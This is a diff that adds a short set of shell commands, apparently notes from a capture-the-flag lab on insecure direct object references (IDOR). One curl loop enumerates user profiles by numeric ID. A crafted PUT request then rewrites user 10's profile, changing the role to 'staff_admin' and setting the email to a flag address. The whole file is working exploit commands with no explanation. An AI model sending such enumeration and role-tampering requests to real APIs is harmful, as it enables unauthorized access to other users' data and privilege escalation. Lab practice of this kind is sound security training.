@@ -1,0 +1,6 @@
+for i in {1..10}; do
+        curl -v http://167.99.88.137:30957/profile/api.php/profile/$i
+done
+
+// simple POST
+curl -i -s -k -X $'PUT'     -H $'Host: 167.99.88.137:30957' -H $'Content-type: application/json' -H $'Origin: http://167.99.88.137:30957' -H $'Content-Length: 209' -H $'DNT: 1' -H $'Connection: close' -H $'Sec-GPC: 1'     -b $'role=employee'     --data-binary $'{"uid":1,"uuid":"40f5888b67c748df7efba008e7c2f9d2","role":"staff_admin","full_name":"admin","email":"flag@idor.htb","about":""}'     $'http://167.99.88.137:30957/profile/api.php/profile/10'
